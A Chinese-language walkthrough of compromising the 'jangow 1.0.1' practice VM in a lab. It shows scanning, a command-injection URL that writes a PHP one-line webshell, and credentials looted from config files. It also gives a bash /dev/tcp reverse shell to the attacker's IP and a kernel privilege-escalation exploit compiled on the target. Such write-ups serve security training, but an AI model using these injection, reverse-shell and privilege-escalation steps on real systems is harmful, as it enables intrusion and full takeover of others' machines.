---
title: "jangow 1.0.1"
date: 2026-03-11
draft: false
weight: 1
tags: ["命令注入", "一句话木马", "蚁剑", "漏洞利用"]
---

## 一、靶机网卡修复
将靶机网络模式修改为**NAT模式**，按`shift`，选择第二个回车，再选择第二个，按`e`，删除"recovery nomodeset"并在末尾添加"quiet splash rw init=/bin/bash，`ctrl + x`在新的红色界面`sudo vim /etc/network/interfaces`（尽量用tab键补全），将网卡信息修改为`ens33`，这里键盘映射问题，无法直接输入`:wq`，所以先大写，按住`shift`，再双击`Z`，接着重置


## 二、识别靶机ip
`sudo arp-scan -l`，靶机ip为`192.168.203.136`

## 三、端口扫描nmap
快速扫描
```ZSH
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sS -sV -sC -T4 192.168.203.136
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-28 06:07 EST
Nmap scan report for 192.168.203.136
Host is up (0.0035s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.18
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-06-10 18:05  site/
|_
|_http-server-header: Apache/2.4.18 (Ubuntu)
MAC Address: 00:0C:29:17:B0:6C (VMware)
Service Info: Host: 127.0.0.1; OS: Unix
```

## 四、获得shell（失败）
### searchsploit
```ZSH
┌──(kali㉿kali)-[~]
└─$ searchsploit vsFTPd 3.0.3                
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 3.0.3 - Remote Denial of Service                                                                                   | multiple/remote/49719.py
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
目标主机FTP版本没有漏洞

### FTP
```ZSH
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.203.136
Connected to 192.168.203.136.
220 (vsFTPd 3.0.3)
Name (192.168.203.136:kali): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> quit
221 Goodbye.
```
不允许匿名访问

## 五、HTTP扫描

### nikto
```ZSH
┌──(kali㉿kali)-[~]
└─$ nikto -h http://192.168.203.136
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.203.136
+ Target Hostname:    192.168.203.136
+ Target Port:        80
+ Start Time:         2026-01-29 03:33:55 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Directory indexing found.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
+ /./: Directory indexing found.
+ /./: Appending '/./' to a directory allows indexing.
+ //: Directory indexing found.
+ //: Apache on Red Hat Linux release 9 reveals the root directory listing by default if there is no index page.
+ /%2e/: Directory indexing found.
+ /%2e/: Weblogic allows source code or directory listing, upgrade to v6.0 SP1 or higher. See: http://www.securityfocus.com/bid/2513
+ ///: Directory indexing found.
+ /?PageServices: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via 'open directory browsing'. Web Publisher should be disabled. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0269
+ /?wp-cs-dump: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via 'open directory browsing'. Web Publisher should be disabled. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0269
+ ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Directory indexing found.
+ ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Abyss 1.03 reveals directory listing when multiple /'s are requested. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1078
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 8102 requests: 0 error(s) and 17 item(s) reported on remote host
+ End Time:           2026-01-29 03:34:05 (GMT-5) (10 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

┌──(kali㉿kali)-[~]
└─$ nikto -h http://192.168.203.136/site/
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.203.136
+ Target Hostname:    192.168.203.136
+ Target Port:        80
+ Start Time:         2026-01-29 03:39:13 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ /site/: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /site/: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /site/: Server may leak inodes via ETags, header found with file /site/, inode: 27ce, size: 5c46fbf4bb499, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
+ /site/css/: Directory indexing found.
+ /site/css/: This might be interesting.
+ 8103 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2026-01-29 03:39:24 (GMT-5) (11 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```


### 目录扫描dirb
```ZSH
┌──(kali㉿kali)-[~]
└─$ dirb http://192.168.203.136

WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

                                                                             GENERATED WORDS: 4612

---- Scanning URL: http://192.168.203.136/ ----
                                                                             + http://192.168.203.136/server-status (CODE:403|SIZE:280)                  
                                                                             ==> DIRECTORY: http://192.168.203.136/site/
                                                                            
---- Entering directory: http://192.168.203.136/site/ ----
                                                                                                                                                          ==> DIRECTORY: http://192.168.203.136/site/assets/
                                                                             ==> DIRECTORY: http://192.168.203.136/site/css/
+ http://192.168.203.136/site/index.html (CODE:200|SIZE:10190)              
                                                                             ==> DIRECTORY: http://192.168.203.136/site/js/
                                                                             ==> DIRECTORY: http://192.168.203.136/site/wordpress/
                                                                            
---- Entering directory: http://192.168.203.136/site/assets/ ----
                                                                             (!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)
                                                                            
---- Entering directory: http://192.168.203.136/site/css/ ----
                                                                             (!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)
                                                                            
---- Entering directory: http://192.168.203.136/site/js/ ----
                                                                             (!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)
                                                                            
---- Entering directory: http://192.168.203.136/site/wordpress/ ----
                                                                             + http://192.168.203.136/site/wordpress/index.html (CODE:200|SIZE:10190)    
                                                                               
-----------------
END_TIME: Wed Jan 28 06:16:22 2026
DOWNLOADED: 13836 - FOUND: 3
```
能点的都看看，也没发现特殊的内容，有wordpress目录，访问后，返回的不是典型的wordpress站点，因此用wpscan确认

### wpscan
```ZSH
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://192.168.203.136/site/wordpress -e u,p
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________


Scan Aborted: The remote website is up, but does not seem to be running WordPress.
```
结果表明靶机没用运行wordpress，只是普通的目录

### gobuster
```ZSH
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.203.136 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.js,.sh,.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.203.136
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,php,html,js,sh
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/site                 (Status: 301) [Size: 317] [--> http://192.168.203.136/site/]                                                                        
/server-status        (Status: 403) [Size: 280]
Progress: 1323348 / 1323348 (100.00%)
===============================================================
Finished
===============================================================
```
也没有有价值的信息

### 网页URL
点击buscar后，提示：`http://192.168.203.136/site/busque.php?buscar=`，可能是本地包含漏洞、命令执行？
本地包含漏洞检测：

```ZSH
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.203.136/site/busque.php?buscar=../../../../../../etc/passwd
```
没有返回内容

命令执行检测：
```ZSH
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.203.136/site/busque.php?buscar=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
结果把传的id带回来了，说明没有对传入参数进行限制，因此这里试试传一句话木马
`http://192.168.203.136/site/busque.php?buscar=echo%20%27%3C?php%20evla($_POST[%22cmd%22])%20?%3E%27%20%3E%20shell.php`
接着ls查看是否成功传入`shell.php`
`http://192.168.203.136/site/busque.php?buscar=ls`
接着用蚁剑连接，连接成功，开始翻垃圾

`/var/www/html/site/wordpress/config.php`中找到神秘内容
```PHP
$servername = "localhost";
$database = "desafio02";
$username = "desafio02";
$password = "abygurl69";
```
`/var/www/html/.backup`中同样神秘内容
```PHP
$servername = "localhost";
$database = "jangow01";
$username = "jangow01";
$password = "abygurl69";
```

**再回过头看**，nmap扫描，有21、80端口，接着目录扫描没找到什么，接着通过蚁剑找到两套php，因此这里试一下21端口。
使用`.backup`中账户密码，登场登录
```ZSH
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.203.136
Connected to 192.168.203.136.
220 (vsFTPd 3.0.3)
Name (192.168.203.136:kali): jangow01
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

## 六、反弹shell
kali中开启监听，用443端口，因为靶机只能用443（不理解）
`nc -lvvp 443`

接着去蚁剑打开靶机终端
`bash -c 'bash -i >& /dev/tcp/192.168.203.129/443 0>&1'`

  - `bash -c`告诉bash解释器执行后面引号里的字符串命令
  - `bash -i`启动一个交互式的bash窗口
  - `>&`是重定向组合符，将标准输出和标准错误都发送到同一个地方
  - `/dev/tcp/192.168.203.129/443`不代表硬盘上的文件，而是尝试与ip为`192.168.203.129`的443端口建立一个tcp网络连接
  - `0>&1`是双向绑定，`0`代表标准输入，`1`代表标准输出，将我的输入也绑定到网络连接上，这样从kali发送的指令，目标机能接收并执行
  - 注（这里的ip地址是kali的地址，蚁剑进入的是靶机的端口，反弹shell）

成功反弹shell
```ZSH
┌──(kali㉿kali)-[~]
└─$ nc -lvvp 443
listening on [any] 443 ...
192.168.203.136: inverse host lookup failed: Unknown host
connect to [192.168.203.129] from (UNKNOWN) [192.168.203.136] 52824
bash: cannot set terminal process group (3862): Inappropriate ioctl for device
bash: no job control in this shell
www-data@jangow01:/var/www/html/site$ 
```

## 七、提权
当前权限为www-data权限，需要提权
先查看内核版本和发行版本
```ZSH
www-data@jangow01:/var/www/html/site$ uname -a
uname -a
Linux jangow01 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
www-data@jangow01:/var/www/html/site$ lsb_release -a
lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 16.04.1 LTS
Release:        16.04
Codename:       xenial
```

接着进行searchsploit搜索漏洞：
```ZSH
┌──(kali㉿kali)-[~]
└─$ searchsploit ubuntu 4.4.0-31 --overflow
------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                          |  Path
------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Linux Kernel 4.10.5 / < 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free                                                    | linux/dos/43234.c
Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x64) - 'AF_PACKET' Race Condition Privilege Escalation             | windows_x86-64/local/47170.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                           | linux/local/45010.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                  | linux/local/44298.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                   | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP) | linux/local/47169.c
Ubuntu < 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation                                  | linux/local/41760.txt
------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

┌──(kali㉿kali)-[~]
└─$ searchsploit ubuntu 16.04 --overflow
------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                          |  Path
------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Apport 2.x (Ubuntu Desktop 12.10 < 16.04) - Local Code Execution                                                        | linux/local/40937.txt
Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Privilege Escalation                                                           | linux/local/40054.c
Google Chrome (Fedora 25 / Ubuntu 16.04) - 'tracker-extract' / 'gnome-video-thumbnailer' + 'totem' Drive-By Download    | linux/local/40943.txt
LightDM (Ubuntu 16.04/16.10) - 'Guest Account' Local Privilege Escalation                                               | linux/local/41923.txt
Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 / CentOS 7.3.1611) - 'ldso_hwcap_64 Stack Clash' Local Privilege Escalation | linux_x86-64/local/42275.c
Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - 'ldso_dynamic Stack Clash' Local Privilege Escalation | linux_x86/local/42276.c
Linux Kernel (Ubuntu 16.04) - Reference Count Overflow Using BPF Maps                                                   | linux/dos/39773.txt
Linux Kernel 4.14.7 (Ubuntu 16.04 / CentOS 7) - (KASLR & SMEP Bypass) Arbitrary File Read                               | linux/local/45175.c
Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege Escalation (Metasploit)                                         | linux/local/40759.rb
Linux Kernel 4.4 (Ubuntu 16.04) - 'snd_timer_user_ccallback()' Kernel Pointer Leak                                      | linux/dos/46529.c
Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privilege Escalation                        | linux_x86-64/local/40871.c
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'target_offset' Out-of-Bounds Privilege Escalation                 | linux_x86-64/local/40049.c
Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x64) - 'AF_PACKET' Race Condition Privilege Escalation             | windows_x86-64/local/47170.c
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege Escalation                            | linux/local/39772.txt
Linux Kernel 4.6.2 (Ubuntu 16.04.1) - 'IP6T_SO_SET_REPLACE' Local Privilege Escalation                                  | linux/local/40489.txt
Linux Kernel 4.8 (Ubuntu 16.04) - Leak sctp Kernel Pointer                                                              | linux/dos/45919.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                           | linux/local/45010.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                  | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation                       | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                   | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP) | linux/local/47169.c
------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

这里选用内核版本的第一个`45010.c`（其后面介绍local privilege escalation），将其下载到本地`searchsploit -m 45010`，再`gcc 45010.c -o exp1`编译
将文件拖出到宿主机，接着放入蚁剑里，赋予权限`chmod +x exp1`，再用`ls -al`查看文件，再`./exp1`执行，

```ZSH
(www-data:/var/www/html/site) $ chmod +x exp1
(www-data:/var/www/html/site) $ ls -al
total 68
drwxr-xr-x 6 www-data www-data  4096 Feb  3 12:48 .
drwxr-xr-x 3 root     root      4096 Oct 31  2021 ..
drwxr-xr-x 3 www-data www-data  4096 Jun  3  2021 assets
-rw-r--r-- 1 www-data www-data    35 Jun 10  2021 busque.php
drwxr-xr-x 2 www-data www-data  4096 Jun  3  2021 css
-rwxr-xr-x 1 www-data www-data 21616 Feb  3 12:48 exp1
-rw-r--r-- 1 www-data www-data 10190 Jun 10  2021 index.html
drwxr-xr-x 2 www-data www-data  4096 Jun  3  2021 js
-rw-r--r-- 1 www-data www-data    30 Feb  3 10:49 shell.php
drwxr-xr-x 2 www-data www-data  4096 Jun 10  2021 wordpress
(www-data:/var/www/html/site) $ ./exp1
./exp1: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./exp1)
```
最后报错，`GLIBC_2.34`没找到，这是由于我在最新的kali linux上编译了程序，但靶机是Ubuntu 16.04，它携带的GLIBC版本远低于2.34，无法满足程序运行的需求

解决思路：让靶机自己编译`45010.c`
因此拖拽45010.c文件到蚁剑里
```zsh
www-data@jangow01:/etc$ cd /var/www/html/site/
www-data@jangow01:/var/www/html/site$ gcc 45010.c -o exp1
gcc 45010.c -o exp1
www-data@jangow01:/var/www/html/site$ chmod +x exp1
chmod +x exp1
www-data@jangow01:/var/www/html/site$ ./exp1
./exp1
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```
提权成功

## 八、总结
总体思路是先进行端口扫描，接着进行网页勘察，接着发现注入漏洞，注入一句话木马，利用蚁剑尝试反弹shell，根据内核版本查找提权的漏洞，接着将病毒源代码放入靶机编译执行，提权